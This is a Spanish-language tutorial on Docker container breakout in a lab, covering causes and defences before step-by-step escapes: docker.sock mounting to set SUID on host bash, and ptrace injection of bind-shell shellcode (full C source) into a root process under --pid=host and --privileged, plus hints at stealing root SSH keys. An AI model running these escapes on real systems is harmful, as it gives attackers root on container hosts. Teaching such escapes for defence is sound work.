---
layout: single
title: Docker Breakout
date: 2025-02-26
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - Seguridad en sistemas operativos
  - Vulnerabilidades y Explotación
tags:
  - escalada de privilegio
  - privilegio
  - linux
  - docker
  - suid
  - vulnerabilidades
  - explotación
  - ciberseguridad
  - root
  - hackingetico
  - contenedores
---
Es un ataque de seguridad en el que un atacante obtiene acceso a los recursos del host que ejecuta contenedores `Docker`, lo que normalmente no estaría permitido, ya que los contenedores deben estar aislados de la máquina anfitriona.
Esto ocurre cuando un atacante logra **escapar del contenedor** en el que está ejecutándose, y **accede al sistema operativo subyacente** (el host) o incluso a otros contenedores en el mismo sitema. Este tipo de vulnerabilidad es una amenaza de seguridad significativa, ya que permite que un atacante obtenga acceso a recursos fuera del contenedor, lo que podría incluir datos sensibles, control total sobre el host, o la capacidad de comprometer otros contenedores.

## Cómo podría ocurrir un Docker Breakout?
1. Vulnerabilidades del Kernel: Los contenedores `Docker` se basan en características del kernel de Linux (como los espacios de nombres o de los cgroups) para lograr aislamiento. Si un atacante puede explotar una vulnerabilidad en el kernel de Linux, podría escapar del contenedor y obtener acceso al sistema host.
2. Malconfiguración de Docker:
Algunas malas prácticas o configuraciones incorrectas pueden hacer que los contenedores sean más vulnerables. Por ejemplo, otorgar privilegios excesivos a un contenedor (como usar el flag `--privileged` o montar directorios del sistema de manaera insegura) puede permitir que un atacante escale privilegios dentro del contenedor y acceda al sistema host.
3. Exploits de Docker: Existen varios ataques diseñados para aprovechar vulnerabilidades en `Docker` o contenedor para "romper" el aislamiento y obtener acceso al host.

## Consecuencias de un Docker Breakout
si un atacante logra hacer un "breakout" desde un contenedor a un host Docker, las consecuencias pueden ser graves. Algunas de las posibilidades implicaciones son:
- **Acceso completo al host**: El atacante puede tener acceso total al sistema operativo del host, lo que puede comprometer todo el servidor o infraestructura.
- **Escalamiento de privilegios**: Si un contenedor se ejecuta con privilegios elevados, un atacante podría intentar acceder a otros contenedores que comparten recursos del sistema.

## Cómo protegerse de un Docker Breakout?
Para evitar o mitigar los riesgos de un Docker breakout, hay varias prácticas recomendadas:
1. **Usar versiones seguras de Docker**: Mantén Docker actualizado y aplica parches de seguridad para evitar vulnerabilidades conocidas.
2. **Evitar contenedores con privilegios elevandos**: No uses el flag `--privileged` a menos que sea absolutamente necesario, ya que esto otorga permisos elevados dentro del contenedor.
3. **Aislar contenedores**: Usa herramientas como `Docker Security Features` (por ejemplo, `seccomp`, `AppArmor`, `SELinux`) para limitar lo que los contenedores pueden hacer. Asegúrate de que los contenedores estén correctamente aislados entre sí.
4. **Control de acceso**: Configura el acceso adecuado a los contenedores. Usa controles de acceso basados en roles `RBAC` y segúrate de que los contenedores no tengan acceso innecesario a recursos del host o a otros contenedores.
5. **Monitorización**: Implementa un monitoreo continuo de la actividades en tus contenedores y el host, para detectar comportamientos anómalos que puedan indicar que un atacante ha intentado escapar del contenedor.
6. **Docker Bench for Security**: Dcoker ofrece una herramienta llamada `Docker bench for Security` que te ayuda a evaluar la seguridad de tu configuración de Docker y a detectar posibles riesgos.

---

## Docker Breakout en entorno controlado

Para comenzar, descargamos una imagen de [Ubuntu Server](https://ubuntu.com/download/server) que sea de 64Bits la virtualizamos y habilitar el modo `Bridged Adapter`

**Dentro del `ubuntu server` instalamos `ssh` si no viene por defecto como `root`**:
```bash
apt update
apt install openssh-server
systemctl status ssh
systemctl start ssh # si el servicio no esta activado, activarlo
systemctl enable ssh
```

**Nos conectamos por `ssh` en nuestra maquina**:
```bash
ssh usuario@IP_UBUNTU_SERVER
```
`export TERM=xterm` para limpiar la consola.


### Primer forma de escapar a la maquina host:
**Instalaciones necesarias**:
```bash
apt install docker.io
```

Normalmente lo que pasa por detrás en `Docker` hay un variable de entorno `UNIT_SOCKET_FILE` que se usa para definir la ruta del archivo de `socket UNIX` que se usa para la comunicación entre el servidor **Unit** y otros procesos. Un **socket UNIX** es un punto de comunicación utilizado por los procesos en un sistema operativo basado en **UNIX** (como Linux) para intercambiar información de manera eficiente y segura.

**Ruta donde se encuentra**:
```bash
file /var/run/docker.sock
```
Este recurso me permite comunicarme con el demonio de `Docker`, cuando el demonio está activo, el servicio como tal. Lo que pasa cuando un `docker images` es donde nosotros podemos interactuar y ver la información de imágenes como de contenedores.

**Creamos una imágen de docker con su última versión**:
```bash
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

**Dentro del contenedor**:
```bash
apt update
apt install docker.io
```

**Dentro del contenedor hacemos lo siguiente**:
```bash
docker images
```

**Salida**
```bash
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
```
*Nos pregunta si el demonio de docker esta corriendo*
El problema esta en que no encuentra este recurso `unix:///var/run/docker.sock.`

---

**Borramos el contenedor**:
```bash
docker rm $(docker ps -a -q) --force
```

Entonces, qué pasa si despliego un contenedor creando una montura para que mi `docker.sock` existente en la máquina host también esté accesible en la máquina del contenedor, porque hay ocasiones para tareas determinadas que se hace:

```bash
docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

**Dentro del contenedor**
```bash
apt update
apt install docker.io
```
**Si hacemos un `docker images` ahora no vamos a tener el problema `unix:///var/run/docker.sock.`. Lo que pasa es que ahora estamos como `root` y me puedo conectar con este `UNIT_SOCKET_FILE` con el objetivo de interactuar con el servicio de `docker` que está corriendo en nuestra máquina host lo que puedo hacer es lo mismo que cuando estamos en el grupo `docker` que creamos un contenedor y le aplicamos monturas para toda la raíz meterla en una ruta dada por ejemplo `/mnt/` del contenedor, esto es algo similar pero desde un contentedor, dentro del contenedor ahora hay imagen de ubuntu para desde acá crear un nuevo contenedor

**En otra ventana de nuestra máquina abrimos otra instancia**
```bash
ssh usuario@IP_MAQUINA_UBUNTU
```

**En la nueva instancia**
```bash
ls -l /bin/bash
```
**Salida**
```bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
**Como vemos, la salida no es `SUID`**


**Dentro del contenedor de la maquina de ubuntu server**
```bash
docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
docker exec -it privesc bash
```
*Con esto nos estaremos conectando al host de la maquina real*


**Nos dirifimos al y le agregamos permisos `SUID`**:
```bash
cd /mnt/root/bin
chmod u+s bash
```

**Salida desde la otra ventana**
```bash
exequiel@ubuntuServerDockerBreakout:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash #esto se ejecuto antes de darle permisos `SUID`
exequiel@ubuntuServerDockerBreakout:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
exequiel@ubuntuServerDockerBreakout:~$ bash -p
bash-5.2# whoami
root
```
**Ahora estamos como `root`**
Desde este punto ahora, si quisiéramos, podríamos meternos en el directorio `/root/.shh` agarrar la clave privada del usuario `root` y meterla dentro de `/root/.ssh` o mi clave pública como `authorized_keys` para que después me pueda conectar por ssh sin que me pida la contraseña.

---

### Segundo forma de escapar a la maquina host:
**Volvemos a dejar configurado como estaba**
En la ruta `/mnt/root/bin` le sacamos los permisos de `SUID` `chmod u-s bash` salimos del contenedor y lo borramos `docker rm $(docker ps -a -q) --force`

Hay muchas formas de escapar del contenedor también a la hora de desplegar un contenedor de esta manera:
```bash
docker run --rm -dit --pid=host --name ubuntuServer ubuntu
```
*De esta forma lo que estás consiguiendo. Al desplegar el contenedor, y hacemos un `python3 -m hhtp.server 8081` nos montamos un servidor como usaruio root.

En otra ventanada del contenedor hacemos:
```bash
ps -faux
```
**Salida**
```bash
root        2027  0.0  0.4  12020  8064 ?        Ss   17:46   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        2194  0.0  0.4  14960  8812 ?        Ss   17:46   0:00  \_ sshd: exequiel [priv]
exequiel    2250  0.0  0.3  14960  6956 ?        S    17:46   0:00  |   \_ sshd: exequiel@pts/1
exequiel    2251  0.0  0.2   8668  5632 pts/1    Ss   17:46   0:00  |       \_ -bash
root        2260  0.0  0.3  16900  7296 pts/1    S+   17:47   0:00  |           \_ sudo su
root        2261  0.0  0.1  16900  2536 pts/0    Ss   17:47   0:00  |               \_ sudo su
root        2262  0.0  0.2   9376  4352 pts/0    S    17:47   0:00  |                   \_ su
root        2263  0.0  0.2   7604  4480 pts/0    S    17:47   0:00  |                       \_ bash
root       12170  0.0  1.0  29208 20224 pts/0    S+   20:34   0:00  |                           \_ python3 -m http.server 8081
```
*Podemos ver esta informacion cual el usuario que lo esta ejecutando*
Una cosa es la máquina y otra es el proceso del contenedor son máquinas totalmente distintas, por lo tanto, lo que nuestros tenemos acá no tendríamos que porque listarlo en el contenedor, pero como lo desplegamos con el parámetro `--pid=host`, todos los procesos que tenemos activos en nuestra máquina host sí que lo vemos y nos podemos comunicar con esto en el contenedor.

**Nos ponemos como `root` y nos conectamos al contenedor**
```bash
docker exec -it ubuntuServer bash
```
**Hacemos un `ps faux` y en el propio contenedor vamos a ver**:
```bash
root        2027  0.0  0.4  12020  8064 ?        Ss   17:46   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        2194  0.0  0.4  14960  8812 ?        Ss   17:46   0:00  \_ sshd: exequiel [priv]
exequiel    2250  0.0  0.3  14960  6956 ?        S    17:46   0:00  |   \_ sshd: exequiel@pts/1
exequiel    2251  0.0  0.2   8668  5632 pts/1    Ss   17:46   0:00  |       \_ -bash
root        2260  0.0  0.3  16900  7296 pts/1    S+   17:47   0:00  |           \_ sudo su
root        2261  0.0  0.1  16900  2536 pts/0    Ss   17:47   0:00  |               \_ sudo su
root        2262  0.0  0.2   9376  4352 pts/0    S    17:47   0:00  |                   \_ su
root        2263  0.0  0.2   7604  4480 pts/0    S    17:47   0:00  |                       \_ bash
root       12170  0.0  1.0  29208 20224 pts/0    S+   20:34   0:00  |                           \_ python3 -m http.server 8081
```
Lo que pasa es que si vemos ese servicio corriendo en esta máquina como host que lo está "Hosteando" este servicio el usuario `root` o cualquier proceso que vea que este como `root` como propietario del servicio, se puede inyectar una `shellcode` que es una instrucción maliciosa a bajo nivel a través de este proceso para que me cree un nuevo subproceso a través del cual me ejecute un comando.

Lo que vamos a hacer que desde este contenedor es inyectar en este proceso que está corriendo `root` como usuario privilegiado de servicio http, vamos a inyectar un comando que me permita montar una `bind shell` la máquina víctima abre un puerto en su máquina y es"escuche" las conexiones entrantes desde el atacante. El atacante se conecta al puerto abierto en la víctima para tener acceso a la `shell`.

**Dentro del contenedor instalaciones necesarias**
```bash
apt update
apt install gcc netcat-traditional nano libcap2-bin
```

---

### Recursos
[0x00sec](https://0x00sec.org/t/linux-infecting-running-processes/1097) esto es un `shellcode` de 32bits
[exploitDB](https://www.exploit-db.com/exploits/41128) esto es un `shellcode` de 64 bits

**Creamos dentro del contenedor un archivo `infect.c` en el directorio `/tmp` y con nano pegamos todo esto**:
```bash 
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 32

unsigned char *shellcode = 
  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
```

**Ahora lo compilamos**
```bash
gcc infect.c -o infect
```

**A la hora de ejecutar le tenemos que pasar el `PID` que lo sacamos con `ps -faux`
```bash
       PID
root  12170  0.0  1.0  29208 20224 pts/0    S+   20:34   0:00  |                           \_ python3 -m http.server 8081
```

**Se ejecuta**:
```bash
./infect 12170
```

**Salida**
```bash
./infect 12194
+ Tracing process 12194
ptrace(ATTACH):: Operation not permitted
```
**Como vemos no tenemos permisos para hacer un `ATTACH` sincronizarme a este `PID` para ejecutar un tarea sobre este proceso y esto es porque ha este contenedor le falta una capabilities**

**Listamos las capabilities**:
```bash
capsh --print | grep "sys_ptrace"
```
**Salida**
```bash
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
```
**Tiene una `! ` adelante, esto quiere decir que estas capabilities no está activa. La podemos activar, salimos del contenedor**:
```bash
exit
docker rm $(docker ps -a -q) --force
docker run --rm -dit --pid=host --privileged --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```

**Volvemos a instalar**
```bash
apt update
apt install libcap2-bin gcc netcat-traditional nano net-tools
```

**Verificamos si ahora tenemos activada la capabilitie**
```bash
capsh --print | grep "sys_ptrace"
```
**Salida**
```bash
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
```
*Ahora no tiene !* vamos a poder sincronizar el `PID` para inyectar un comando como privilegiado* verificamos que el servicio siga corriendo y que `PID` sea el mismo con `ps -faux`
**Tenemos que volver a crear el archivo `nano infect.c` en la ruta `/tmp` y compilarlo con `gcc infect.c -o infect` y lo ejecutamos `./infect PID`**

**Salida**
```bash
/infect 12170
+ Tracing process 12170
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7b183471b494
+ Setting instruction pointer to 0x7b183471b496
+ Run it!
```
**Esto lo que hizo es abrirnos el puerto "5800" en la máquina "host" y ahora con `netcat` con, `hostname -I` vemos mi "IP" que es la `172.17.02  y la del contenedor que corresponde a la máquina host es la 172.17.0.1 y me conecto al puerto "5600" que lo abre temporalmente**:

```bash
nc 172.17.0.1 5600
```
*Ahora estoy conectado* verifico haciendo `whoami`

```bash
root@4146294e0d0d:/tmp# nc 172.17.0.1 5600
whoami
root
hostname -I
192.168.0.121 172.17.0.1 2800:810:50f:a2f1:9573:c506:71b4:2c37 fdaa:bbcc:ddee:0:a00:27ff:fe1c:4fb1 2800:810:50f:a2f1:a00:27ff:fe1c:4fb1 
```
*Estoy en la maquina el host real* hacemos un tratamiento de tty
```bash
script /dev/null -c bash
# CTRL + z
stty raw -echo; fg
reset xterm
```

### Tercer forma de escapar a la maquina host:
*Borramos todo de lo que hicimos anteriormente*
```bash
exit
docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
```

Que es `Portainer` es una herramienta de gestíon de contenedores que proporciona una interfaz gráfica de usuario (GUI) fácil de usar para administrar **contenedores Docker y Kubernetes**

**En la maquina host de ubuntu server vamos hacer**:
```bash
docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
```

*Ahora entramos al navegador con el puerto "9000" de la maquina ubuntu server lo averiguamos con hostname -I* por ejemplo 192.168.0.121:9000

